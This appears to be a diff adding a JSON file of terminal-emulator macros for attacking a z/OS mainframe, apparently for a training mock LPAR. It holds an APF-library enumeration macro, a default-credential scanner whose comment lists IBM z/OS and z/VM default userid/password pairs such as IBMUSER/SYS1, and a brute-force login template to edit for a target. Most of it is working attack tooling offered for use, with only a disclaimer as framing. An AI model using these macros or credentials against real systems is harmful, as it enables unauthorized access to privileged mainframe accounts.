@@ -1,0 +1,140 @@
+[
+  {
+    "name": "APF List Scanner",
+    "description": "Enumerates APF-authorized libraries via TSO LISTAPF. From the ISPF menu selects option 6 (Command Shell) then runs LISTAPF. Works against the mock LPAR and real z/OS.",
+    "source": "security",
+    "created": "2026-06-12T00:00:00.000Z",
+    "modified": "2026-06-12T00:00:00.000Z",
+    "steps": [
+      {
+        "op": "waitScr",
+        "text": "ISPF Primary Option Menu",
+        "timeout": 15000,
+        "comment": "Wait for ISPF Primary Option Menu"
+      },
+      {
+        "op": "type",
+        "row": 2,
+        "col": 13,
+        "text": "6"
+      },
+      {
+        "op": "aid",
+        "aid": "ENTER",
+        "fields": [],
+        "comment": "Select option 6 - Command Shell"
+      },
+      {
+        "op": "waitScr",
+        "text": "ISPF Command Shell",
+        "timeout": 10000,
+        "comment": "Wait for TSO Command Shell panel"
+      },
+      {
+        "op": "type",
+        "row": 3,
+        "col": 17,
+        "text": "LISTAPF",
+        "comment": "TSO Command ===> field is at row 3, col 17"
+      },
+      {
+        "op": "aid",
+        "aid": "ENTER",
+        "fields": [],
+        "comment": "Submit LISTAPF command"
+      },
+      {
+        "op": "waitScr",
+        "text": "LISTAPF Output",
+        "timeout": 10000,
+        "comment": "Wait for APF list — note USER.LOADLIB flagged as writable"
+      },
+      {
+        "op": "pause",
+        "ms": 2000,
+        "comment": "Allow output to render — use Traffic Recorder to capture results"
+      }
+    ]
+  },
+  {
+    "name": "RACF Default Credential Scanner",
+    "description": "Attempts well-known IBM default and commonly found RACF credentials against the logon panel. Covers IBMUSER, MAINT, OPERATOR and other IBM-supplied accounts. Lockout triggers after 3 failures per userid — this macro attempts one credential only. Duplicate with different userid/password for additional attempts. FOR AUTHORIZED TRAINING USE ONLY.",
+    "source": "security",
+    "created": "2026-06-12T00:00:00.000Z",
+    "modified": "2026-06-12T00:00:00.000Z",
+    "steps": [
+      {
+        "op": "waitScr",
+        "text": "TSO/E LOGON",
+        "timeout": 15000,
+        "comment": "Wait for mock z/OS logon screen"
+      },
+      {
+        "op": "type",
+        "row": 5,
+        "col": 15,
+        "text": "IBMUSER",
+        "comment": "--- WORDLIST: Try each userid/password pair below ---\nz/OS defaults (source: IBM documentation + pen-test community):\n  IBMUSER / SYS1      (IBM primer userid, hard-coded into RACF, ships with SYSTEM SPECIAL)\n  IBMUSER / IBMUSER   (common after SYS1 fails)\n  MAINT   / MAINT     (IBM maintenance account)\n  MAINT   / SYS1\n  SYSPROG / SYSPROG\n  SYSADM  / SYSADM\n  TSTADMIN/ TSTADMIN\n  BATCH   / BATCH     (common batch job userid)\n  CICS    / CICS      (CICS region userid)\n  DB2     / DB2       (DB2 region userid)\n  MQ      / MQ        (MQ region userid)\nz/VM defaults:\n  OPERATOR/ OPERATOR  (default z/VM system operator)\n  MAINT   / MAINT     (default z/VM maintenance logon)\n  MAINT730/ MAINT730  (version-specific maintenance id)\n  PMAINT  / PMAINT    (privileged maintenance)\n  TCPMAINT/ TCPMAINT  (TCP/IP maintenance)\n  AUTOLOG1/ AUTOLOG1  (auto-logon service machine)\nChange the userid/password in the type steps below to test each pair."
+      },
+      {
+        "op": "type",
+        "row": 6,
+        "col": 15,
+        "text": "SYS1",
+        "comment": "Attempt: IBMUSER/SYS1 — IBM-supplied default, most commonly found unlocked on poorly administered systems"
+      },
+      {
+        "op": "aid",
+        "aid": "ENTER",
+        "fields": [],
+        "comment": "Submit credentials"
+      },
+      {
+        "op": "waitScr",
+        "text": "TSO/E - Ready",
+        "timeout": 5000,
+        "comment": "Success — logon landed on READY prompt"
+      }
+    ]
+  },
+  {
+    "name": "RACF Brute Force Template",
+    "description": "Template for automated RACF login attempts. Edit userid/password in the type steps to match your target. Lockout triggers after 3 consecutive failures — respect the threshold. FOR AUTHORIZED TRAINING USE ONLY.",
+    "source": "security",
+    "created": "2026-06-12T00:00:00.000Z",
+    "modified": "2026-06-12T00:00:00.000Z",
+    "steps": [
+      {
+        "op": "waitScr",
+        "text": "TSO/E LOGON",
+        "timeout": 15000,
+        "comment": "Wait for mock z/OS logon screen"
+      },
+      {
+        "op": "type",
+        "row": 5,
+        "col": 15,
+        "text": "IBMUSER",
+        "comment": "Target userid — edit before running"
+      },
+      {
+        "op": "type",
+        "row": 6,
+        "col": 15,
+        "text": "SYS1",
+        "comment": "Password attempt — edit before running"
+      },
+      {
+        "op": "aid",
+        "aid": "ENTER",
+        "fields": []
+      },
+      {
+        "op": "waitScr",
+        "text": "TSO/E - Ready",
+        "timeout": 5000,
+        "comment": "Success condition — READY prompt means logon succeeded"
+      }
+    ]
+  }
+]
